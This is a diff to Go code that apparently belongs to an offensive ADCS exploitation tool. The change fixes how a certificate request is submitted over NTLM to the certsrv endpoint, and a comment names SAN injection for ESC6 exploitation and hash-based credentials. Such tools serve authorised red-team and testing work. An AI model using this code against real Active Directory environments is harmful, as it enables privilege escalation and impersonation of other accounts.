@@ -176,8 +176,16 @@ func newNTLMClient(cfg *ADCSConfig) *http.Client {
 // The CertAttrib field carries the template name and optional SAN injection
 // attribute (for ESC6 exploitation).
 func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateName string, sanAttrib string) (*x509.Certificate, error) {
-	// Base64-encode the CSR in PEM-style (certsrv expects the inner base64, not full PEM)
-	csrB64 := base64.StdEncoding.EncodeToString(csrDER)
+	// Base64-encode the CSR with line breaks (certsrv expects PEM-style 76-char lines)
+	csrB64Raw := base64.StdEncoding.EncodeToString(csrDER)
+	var csrB64 string
+	for i := 0; i < len(csrB64Raw); i += 76 {
+		end := i + 76
+		if end > len(csrB64Raw) {
+			end = len(csrB64Raw)
+		}
+		csrB64 += csrB64Raw[i:end] + "\r\n"
+	}
 
 	// Build CertAttrib field
 	certAttrib := fmt.Sprintf("CertificateTemplate:%s", templateName)
@@ -189,6 +197,7 @@ func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateNa
 		"Mode":             {"newreq"},
 		"CertRequest":      {csrB64},
 		"CertAttrib":       {certAttrib},
+		"Type":             {"pkcs10"},
 		"TargetStoreFlags": {"0"},
 		"SaveCert":         {"yes"},
 	}
@@ -227,6 +236,8 @@ func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateNa
 			lastErr = fmt.Errorf("read response body: %w", err)
 			continue
 		}
+
+		fmt.Printf("[*] certsrv response: HTTP %d, %d bytes\n", resp.StatusCode, len(body))
 
 		if resp.StatusCode == http.StatusUnauthorized {
 			lastErr = fmt.Errorf("authentication failed (HTTP 401) — check credentials/hash")
